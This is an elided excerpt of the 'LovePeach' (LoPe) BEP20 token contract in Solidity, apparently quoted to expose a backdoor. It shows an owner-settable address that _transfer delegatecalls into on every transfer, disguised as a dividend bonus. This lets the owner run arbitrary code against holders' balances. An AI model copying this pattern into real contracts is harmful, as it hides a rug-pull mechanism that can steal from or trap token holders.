...
contract LovePeach is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'LovePeach';
  string private constant _symbol = 'LoPe';
  ...
  */
  ...
  function claimDividendLoPe(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_LoPe.delegatecall(
  ...
  function SetBonusLoPe(address c) public onlyOwner {
    C_LoPe = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendLoPe(sender, recipient, amount);   
